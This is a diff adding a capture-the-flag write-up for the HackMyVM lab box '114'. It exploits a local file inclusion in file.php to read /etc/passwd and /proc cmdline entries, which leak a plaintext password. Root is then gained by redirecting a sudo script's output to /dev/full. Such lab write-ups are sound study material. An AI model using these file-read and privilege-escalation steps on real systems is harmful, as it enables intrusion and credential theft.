@@ -1,0 +1,187 @@
+---
+title: 114
+date: '2026-05-21'
+description: 'Easy HackMyVM box: LFI to procfs credential leak, then a /dev/full trick for root.'
+type: writeup
+platform: hackmyvm
+tags:
+  - Easy
+  - Linux
+  - LFI
+  - Procfs
+  - Credential Leak
+  - Sudo
+  - Bash Logic Bug
+cover: /images/114.svg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+*Hey brooders! another HackMyVM machine. This one is called "114" and it's rated as easy. Let's dive in!*
+
+## Recon
+
+First things first, let's see what we're working with. I ran an `nmap` scan to check the open ports:
+
+```bash
+ζ nmap -sCV -A 192.168.56.103 -O                                                                                                 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-21 15:22 -0400
+Nmap scan report for 192.168.56.103
+Host is up (0.00056s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Welcome
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Welcome
+MAC Address: 08:00:27:D8:8E:D1 (Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+```
+
+Since port 80 is open, we need to fuzz the website.
+
+```bash
+ζ gobuster dir -u http://192.168.56.103 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt -x php,js,css,txt -b 403,404
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.103
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              txt,php,js,css
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+index.html           (Status: 200) [Size: 615]
+.                    (Status: 200) [Size: 615]
+file.php             (Status: 500) [Size: 0]
+Progress: 57120 / 57120 (100.00%)
+```
+
+Hmm, HTTP status 500 usually means the server is waiting for something else, like a parameter. So we need to fuzz the parameter name too. At this point, it looked like we might be dealing with an LFI.
+
+```bash
+ζ ffuf -w /usr/share/wordlists/param.txt -u http://192.168.56.103/file.php\?FUZZ\=x -fc 500                                      
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.56.103/file.php?FUZZ=x
+ :: Wordlist         : FUZZ: /usr/share/wordlists/param.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 500
+________________________________________________
+
+file                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
+```
+So yeah, we are dealing with an LFI.
+
+```bash
+ζ curl http://192.168.56.103/file.php\?file\=/etc/passwd                                                                         
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+```
+So we found the user "welcome".
+
+With the LFI, we can also read the user flag.
+```bash
+ζ curl http://192.168.56.103/file.php\?file\=/home/welcome/user.txt
+flag{user-210f652e7e3b7e7359e523ef04e96295}
+```
+After that, we need to escalate to root.
+
+To move forward, I started reading files that usually exist on a Linux system. After that, I switched to checking processes manually through `/proc`, since we could not use tools like `ps` the normal way through the LFI.
+
+So I used this small loop to read PIDs from 1 to 5000 until I found credentials:
+
+```bash
+for i in {1..5000}; do
+  cmd=$(wget -qO- "http://192.168.56.103/file.php?file=/proc/$i/cmdline" | tr '\0' ' ')
+  if [ -n "$cmd" ]; then
+    echo "PID $i: $cmd"
+  fi
+done
+
+PID 1: /sbin/init 
+...
+PID 353: service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080 infinity 
+```
+We got the password for the user welcome: "6WXqj9Vc2tdXQ3TN0z54".
+
+Now we can SSH into the machine easily and check what permissions he has.
+
+```bash
+ζ ssh welcome@192.168.56.103
+
+welcome@114:~$ sudo -l
+Matching Defaults entries for welcome on 114:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on 114:
+    (ALL) NOPASSWD: /opt/read.sh
+    (ALL) NOPASSWD: /opt/short.sh
+```
+
+So he can execute scripts in the `/opt` folder. After reading both files, `/opt/short.sh` was clearly the interesting one.
+
+```bash
+welcome@114:~$ cat /opt/short.sh 
+#!/bin/bash
+
+PATH=/usr/bin
+My_guess=$RANDOM
+
+echo "This is script logic"
+cat << EOF
+if [ "$1" != "$My_guess" ] ;then
+    echo "Nop"; 
+else
+    bash -i;
+fi
+EOF
+
+[ "$1" != "$My_guess" ] && echo "Nop" || bash -i
+```
+
+If we want `bash -i` to run, we need to make `echo "Nop"` fail. The trick here is to give it nowhere to write, so we can redirect the output to `/dev/full` and force that failure:
+```bash
+welcome@114:~$ sudo /opt/short.sh HELLO >/dev/full
+welcome@114:~$ sudo /opt/short.sh HELLO >/dev/full 
+/opt/short.sh: line 6: echo: write error: No space left on device
+cat: write error: No space left on device
+/opt/short.sh: line 15: echo: write error: No space left on device
+root@114:/home/welcome# cat /root/root.txt root.txt
+root@114:/home/welcome# exit
+welcome@114:~$ cat root.txt
+```
+Because we used /dev/full, we could not read the file with cat or print it to stdout. So, you can copy the file, exit the SSH session, and read the flag as the welcome user. Another option is to set the SUID bit on bash and execute it again as welcome.
+
+
+Rooted GG.
+
